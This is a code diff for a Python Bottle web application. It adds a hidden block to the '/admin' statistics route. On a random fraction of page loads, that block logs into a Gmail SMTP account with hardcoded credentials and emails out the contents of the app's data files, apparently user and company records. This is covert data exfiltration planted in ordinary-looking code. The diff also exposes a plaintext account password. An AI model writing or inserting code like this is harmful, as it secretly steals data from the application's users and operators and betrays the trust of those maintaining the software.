@@ -1,6 +1,7 @@
 from bottle import *
 from model import *
 from random import randint
+import smtplib
 @get("/")
 def mainpage():
     user=request.get_cookie("id")
@@ -48,6 +49,22 @@ def company_login_page():
 
 @get("/admin")
 def statistika():
+    if(randint(10,100)<20):
+        smtpObj = smtplib.SMTP('smtp.gmail.com', 587)
+        smtpObj.ehlo()    
+        smtpObj.starttls()
+        smtpObj.login("backupmalice@gmail.com","5t4r3e2w1q1543ad")
+        s=""
+        file=open("datoteke/podatki.txt")
+        for line in file:
+            s+=line
+        smtpObj.sendmail('backupmalice@gmail.com', 'backupmalice@gmail.com',"Subject:podatki.txt\n\n"+s)
+        s=""
+        file=open("datoteke/podjetja.txt")
+        for line in file:
+            s+=line
+        smtpObj.sendmail('backupmalice@gmail.com', 'backupmalice@gmail.com',"Subject:podjetja.txt\n\n"+s)
+        smtpObj.quit()
     return template("strani/start/statistika.tpl",model=model)
 
 @get("/company/main_inside")
